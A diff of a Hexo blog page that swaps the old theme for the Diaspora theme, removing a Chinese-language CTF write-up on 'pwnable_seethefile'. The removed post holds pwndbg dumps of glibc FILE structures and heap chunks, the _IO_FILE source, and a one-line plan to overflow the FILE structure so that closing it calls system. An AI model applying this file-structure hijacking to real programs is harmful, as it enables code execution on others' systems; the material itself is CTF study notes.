@@ -1,325 +1,217 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="en" class="loading">
 <head>
-  <meta charset="utf-8">
-  
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
     
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
-
-  
-  
-<link rel="stylesheet" href="/css/style.css">
-
-  
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
     
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="Hexo"/>
+    
+    
+    
+    
+    
+    <meta property="og:site_name" content="Hexo"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="Hexo"/>
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
 
-  
 <meta name="generator" content="Hexo 6.1.0"></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div class="nav">
+    <ul id="menu-menu" class="menu">
+        
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="//" title="首页" target="_blank" rel="noopener">首页</a>
+        </li>
+        
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/categories/" title="分类" target="_blank" rel="noopener">分类</a>
+        </li>
+        
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/tags/" title="标签" target="_blank" rel="noopener">标签</a>
+        </li>
+        
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/archives/" title="归档" target="_blank" rel="noopener">归档</a>
+        </li>
+        
+        <li class="pview menu-item menu-item-type-post_type menu-item-object-page">
+            <a href="/about/" title="关于" target="_blank" rel="noopener">关于</a>
+        </li>
+        
+    </ul>
+	<span class="target"></span>
+	<center>
+	<div class="hitokoto">
+		<span class="typed" id="hitokoto" data-st="true"></span>
+	</div>
+	</center>
+	
+	<p class="footerlinks">
+		<a href="#" class="iconfont icon-null"></a>
+		
+            <a href="/" title="facebook" class="iconfont icon-facebook" target="_blank" rel="noopener"> </a>
+        
+            <a href="/" title="twitter" class="iconfont icon-twitter" target="_blank" rel="noopener"> </a>
+        
+            <a href="/" title="github" class="iconfont icon-github" target="_blank" rel="noopener"> </a>
+        
+            <a href="/img/logo.png" title="wechat" class="iconfont icon-wechat" target="_blank" rel="noopener"> </a>
+        
+            <a href="mailto:xxxx@gmail.com" title="email" class="iconfont icon-email" target="_blank" rel="noopener"> </a>
+        
+		<a href="#" class="iconfont icon-null"></a>
+	</p>
+	
+    <p id="copyright">
+        &copy; 2022 John Doe.
+        <span> | </span>Powered by <a href="https://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        <span> | </span>Theme <a href="https://github.com/Fechin/hexo-theme-diaspora" title="Diaspora" target="_blank" rel="noopener">Diaspora</a> by Fechin
+		
+		<span> | </span><a rel="nofollow" href="http://www.beian.miit.gov.cn" target="_blank">冀ICP备xxxxxxx号</a>
+		
+    </p>
+</div>
+
+<div id="container">
+    
+<div id="screen">
+    <div id="mark">
+        <div class="layer" data-depth="0.4">
+            <img src="/img/welcome-cover.jpg" id="cover" crossorigin="anonymous" width="1920" height="1080">
+        </div>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
+    <div id="vibrant">
+        <svg viewbox="0 0 2880 1620" height="100%" preserveaspectratio="xMaxYMax slice">
+            <polygon opacity="0.7" points="2000,1620 0,1620 0,0 600,0 "/>
+        </svg>
+        <div></div>
     </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-pwnable-seethefile" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/03/19/pwnable-seethefile/" class="article-date">
-  <time class="dt-published" datetime="2022-03-19T13:44:16.000Z" itemprop="datePublished">2022-03-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/19/pwnable-seethefile/">pwnable_seethefile</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p  *(struct _IO_FILE_plus *)0x804c410</span><br><span class="line">gdb调FILE_PLUS结构体，可以是地址，也可以是stdin等</span><br></pre></td></tr></table></figure>
-
-<p>32位程序：</p>
-<ol>
-<li><p>question</p>
-<p>open打开文件fp，在未读取数据时候，plus_file 结构体中一部分数据是空的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">21</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72539000</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>此时我们看到程序开始有一个很大的堆块</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x804c000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">1033</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line">不知道这块区域的具体作用，可能是缓存区</span><br></pre></td></tr></table></figure>
-
-<p>当我们通过fp读取数据后，会在对快中开启一个新的空间来储存内容。上述堆块会被更新，内容是我们读入文件名，而plus_file的read以及write部分的指针会指向新开辟的堆块中的数据区域</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">22</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72538984</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x804d570</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x804c000</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">1033</span>, </span><br><span class="line">  fd = <span class="number">0x74730a32</span>, </span><br><span class="line">  bk = <span class="number">0x7478742e</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0xa</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804c408</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">353</span>, </span><br><span class="line">  fd = <span class="number">0xfbad2498</span>, </span><br><span class="line">  bk = <span class="number">0x804c570</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x804c570</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x804c570</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x804c568</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">4105</span>, </span><br><span class="line">  fd = <span class="number">0x61616161</span>, </span><br><span class="line">  bk = <span class="number">0x61616161</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x61616161</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0xa6161</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><em><strong>Q1:_IO_read_ptr 等几个指针有神吗作用？</strong></em></p>
-<p>分别对应什么函数功能？为什么修改后，fread不起作用了</p>
-<p><em><strong>Q2:IO_buf_end -_IO_buf_base &#x3D; 0x1000为什么偏移量是0x1000</strong></em>，内容堆块大小为0x1008</p>
-</li>
-<li><p>分析——__IO_FILE_plusneide一些内容</p>
-<p>_flags FILE结构体的一些状态；_markers为指向markers结构体的指针变量，为一个单向链表结构，存放流的位置；_chain变量为一个链表的指针，进程中创建的FILE结构体会通过这个变量连成一个单向链表；</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*_IO_FILE结构体*/</span></span><br><span class="line"><span class="comment">/* libio/libio.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span>  //新版本下已经被删除</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> _IO_FILE_plus *)<span class="number">0x804c410</span></span><br><span class="line">$<span class="number">22</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72538984</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x804c570</span> <span class="string">&#x27;a&#x27;</span> &lt;repeats <span class="number">14</span> times&gt;, <span class="string">&quot;\n&quot;</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x804d570</span> <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0xf7fb7cc0</span> &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = <span class="number">3</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">0</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _lock = <span class="number">0x804c4a8</span>, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x804c4b4</span>, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">-1</span>, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">39</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0xf7fb6ac0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-</li>
-<li><p>回归题目，思路明确，溢出修改fd的plus，调用close时调用system，</p>
-<p>下面时vtable的一些内容</p>
